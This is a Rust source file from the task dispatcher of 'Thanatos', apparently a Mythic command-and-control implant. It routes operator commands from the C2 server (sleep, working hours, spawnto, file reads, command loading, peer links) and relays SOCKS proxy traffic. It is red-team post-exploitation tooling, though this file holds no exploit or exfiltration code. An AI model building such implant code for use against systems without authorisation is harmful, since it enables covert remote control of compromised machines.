// TODO: Split up link and socks to separate files

use std::{
    collections::VecDeque,
    sync::{
        atomic::{AtomicBool, Ordering},
        mpsc, Arc,
    },
};

use agent_utils::{
    cmddefs::ThanatosCommand,
    errors::ThanatosError,
    msg::{
        CompletedTask, GetTaskingMsg, GetTaskingResponse, MythicStatus, PendingTask, SocksMsg,
        SpawnToValue, TaskResults,
    },
};

#[cfg(any(feature = "http"))]
use crate::{
    agent::egress_agent::AgentShared,
    internalcmds::{
        disableprofile::disable_profile, enableprofile::enable_profile, profiles::profiles,
        sleep::sleep_agent,
    },
};

use crate::{
    internalcmds::{socks::handle_socks, workinghours::workinghours},
    link::DelegateInfo,
    load,
};

#[cfg(feature = "tcp")]
use crate::agent::p2p_agent::AgentShared;

/// Info about currently running socks connections
pub struct SocksInfo {
    tx: std::sync::mpsc::Sender<SocksMsg>,
    rx: std::sync::mpsc::Receiver<SocksMsg>,
    server_id: usize,
}

pub struct BackgroundTask {
    pub jid: u32,
    pub uuid: String,
    pub running: Arc<AtomicBool>,
    pub tx: mpsc::Sender<PendingTask>,
    pub rx: mpsc::Receiver<CompletedTask>,
    pub detached: bool,
}

/// Structure for dispatching tasks
pub struct Tasker {
    pub delegates: Vec<DelegateInfo>,
    socks: Vec<SocksInfo>,
    pub loaded_commands: Vec<Arc<load::LoadInfo>>,
    pub exec_internal: bool,
    pub spawnto: Option<SpawnToValue>,
    pub background_tasks: Vec<BackgroundTask>,
    pub cached_ids: VecDeque<u32>,
    pub dispatch_val: u32,
}

impl Tasker {
    /// Constructs a new `Tasker` object
    pub fn new() -> Self {
        let spawnto = config::get_spawnto().and_then(|s| {
            let mut s_val = s.split(" ");
            let path = s_val.next()?.to_string();
            let args: Vec<String> = s_val.map(|s| s.to_string()).collect();

            Some(SpawnToValue { path, args })
        });

        Self {
            delegates: Vec::new(),
            socks: Vec::new(),
            loaded_commands: Vec::new(),
            exec_internal: true,
            spawnto,
            background_tasks: Vec::new(),
            cached_ids: VecDeque::new(),
            dispatch_val: 0,
        }
    }

    /// Processes any pending tasks and returns the result
    pub fn process_messages(
        &mut self,
        tasking_info: GetTaskingResponse,
        shared: &mut AgentShared,
    ) -> GetTaskingMsg {
        let mut completed_msg = GetTaskingMsg::default();

        for sock in tasking_info.socks {
            self.handle_sock(sock);
        }

        self.process_tasking(&mut completed_msg, shared, tasking_info.tasks);
        self.process_delegates(&mut completed_msg, tasking_info.delegates);

        for sock in self.socks.iter_mut() {
            while let Ok(msg) = sock.rx.try_recv() {
                completed_msg.socks.push(msg);
            }
        }

        if !self.background_tasks.is_empty() {
            self.receive_background_msgs(&mut completed_msg);
        }

        completed_msg
    }

    fn process_tasking(
        &mut self,
        completed_msg: &mut GetTaskingMsg,
        shared: &mut AgentShared,
        tasks: Vec<PendingTask>,
    ) {
        for task in tasks {
            let task_id = task.id.clone();
            let results = match self.process_task(shared, task) {
                Ok(Some(attributes)) => attributes,
                Err(e) => TaskResults {
                    status: MythicStatus::Error,
                    completed: true,
                    user_output: Some(e.to_string()),
                    ..Default::default()
                },
                _ => continue,
            };

            completed_msg.responses.push(CompletedTask {
                task_id,
                task_attributes: results,
            });
        }
    }

    fn receive_background_msgs(&mut self, completed_msg: &mut GetTaskingMsg) {
        let mut completed_tasks = Vec::new();
        for background_task in &self.background_tasks {
            if background_task.detached {
                match background_task.rx.try_recv() {
                    Ok(t) => completed_tasks.push(t),
                    _ => (),
                }
            } else {
                let mut completion_buffer = VecDeque::new();
                while let Ok(completed_result) = background_task.rx.recv() {
                    completion_buffer.push_back(completed_result);
                }

                if let Some(back) = completion_buffer.back_mut() {
                    back.task_attributes.completed = true;
                }

                completed_tasks.extend::<Vec<CompletedTask>>(completion_buffer.into());
            }

            if !background_task.running.load(Ordering::SeqCst)
                || Arc::strong_count(&background_task.running) == 1
            {
                while let Ok(msg) = background_task.rx.try_recv() {
                    completed_tasks.push(msg);
                }

                self.cached_ids.push_back(background_task.jid);
            }
        }

        completed_msg.responses.extend(completed_tasks);
        self.background_tasks
            .retain(|task| task.running.load(Ordering::SeqCst));
    }

    /// Processes a single task
    fn process_task(
        &mut self,
        shared: &mut AgentShared,
        task: PendingTask,
    ) -> Result<Option<TaskResults>, ThanatosError> {
        Ok(if task.command == ThanatosCommand::Link {
            Some(self.add_link(&task)?)
        } else {
            match task.command {
                ThanatosCommand::Exit => {
                    shared.exit_agent = true;
                    Some(TaskResults {
                        completed: true,
                        ..Default::default()
                    })
                }

                ThanatosCommand::WorkingHours => Some(workinghours(task, shared)?),

                #[cfg(any(feature = "http", feature = "https"))]
                ThanatosCommand::DisableProfile => Some(disable_profile(task, shared)?),
                #[cfg(any(feature = "http", feature = "https"))]
                ThanatosCommand::EnableProfile => Some(enable_profile(task, shared)?),
                #[cfg(any(feature = "http", feature = "https"))]
                ThanatosCommand::Profiles => Some(profiles(task, shared)?),

                ThanatosCommand::ExecutionMethod => Some(self.handle_executionmethod(task)?),
                ThanatosCommand::SpawnTo => Some(self.handle_spawnto(task)?),

                #[cfg(any(feature = "http", feature = "https"))]
                ThanatosCommand::Sleep => Some(sleep_agent(task, shared)?),

                #[cfg(feature = "tcp")]
                ThanatosCommand::Sleep
                | ThanatosCommand::DisableProfile
                | ThanatosCommand::Profiles
                | ThanatosCommand::EnableProfile => unreachable!(),

                #[cfg(feature = "pwd")]
                ThanatosCommand::Pwd => Some(TaskResults {
                    completed: true,
                    user_output: Some(
                        commands_pwd::base::pwd().map_err(|_| ThanatosError::os_error())?,
                    ),
                    ..Default::default()
                }),

                #[cfg(not(feature = "pwd"))]
                ThanatosCommand::Pwd => self.run_loaded(task)?,

                #[cfg(feature = "cat")]
                ThanatosCommand::Cat => Some(commands_cat::base::cat(task)?),

                #[cfg(not(feature = "cat"))]
                ThanatosCommand::Cat => self.run_loaded(task)?,

                #[cfg(feature = "cd")]
                ThanatosCommand::Cd => Some(commands_cd::base::cd(task)?),

                #[cfg(not(feature = "cd"))]
                ThanatosCommand::Cd => self.run_loaded(task)?,

                ThanatosCommand::Link => unreachable!(),

                ThanatosCommand::Load => Some(self.load_command(task)?),
                ThanatosCommand::Unload => Some(self.unload_command(task)?),
            }
        })
    }

    fn handle_sock(&mut self, sock: SocksMsg) {
        if let Some(socks_handler) = self
            .socks
            .iter_mut()
            .find(|s| s.server_id == sock.server_id)
        {
            let _ = socks_handler.tx.send(sock);
        } else {
            let (server_tx, client_rx) = std::sync::mpsc::channel();
            let (client_tx, server_rx) = std::sync::mpsc::channel();

            std::thread::spawn(move || {
                handle_socks(client_tx, client_rx);
            });

            let server_id = sock.server_id;
            let _ = server_tx.send(sock);

            self.socks.push(SocksInfo {
                tx: server_tx,
                rx: server_rx,
                server_id,
            });
        }
    }
}

impl Default for Tasker {
    fn default() -> Self {
        Self::new()
    }
}
